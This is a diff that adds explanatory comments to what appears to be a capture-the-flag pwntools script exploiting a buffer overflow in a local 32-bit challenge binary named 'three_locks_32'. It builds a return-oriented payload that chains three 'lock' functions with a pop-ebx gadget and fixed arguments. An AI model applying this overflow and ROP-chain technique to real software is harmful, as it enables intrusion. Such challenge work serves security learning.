@@ -136,17 +136,17 @@ p = process("./three_locks_32")
 lock1 = 0x8048506
 lock2 = 0x804856d
 lock3 = 0x80485da
-pop_ret = 0x08048361
+pop_ret = 0x08048361 #pop ebx; ret 
 
 #payload construction (ropping)
-payload = cyclic(cyclic_find("jaaa"))
-payload += p32(lock1)
-payload += p32(pop_ret)
-payload += p32(5)
-payload += p32(lock2)
-payload += p32(lock3)
-payload += p32(42)
-payload += p32(1776)
+payload = cyclic(cyclic_find("jaaa")) #overflow right before the ret address
+payload += p32(lock1) #jump to lock1, it doesn't neet 'rdi', it immediately looks for function arguments below next value of stack 
+payload += p32(pop_ret) #ret after lock1
+payload += p32(5) #first argument
+payload += p32(lock2) #5 is popped, the next return or jump is to lock2
+payload += p32(lock3) #return after lock2
+payload += p32(42) #first argument
+payload += p32(1776) #second argument
 
 p.sendline(payload)
 p.interactive()
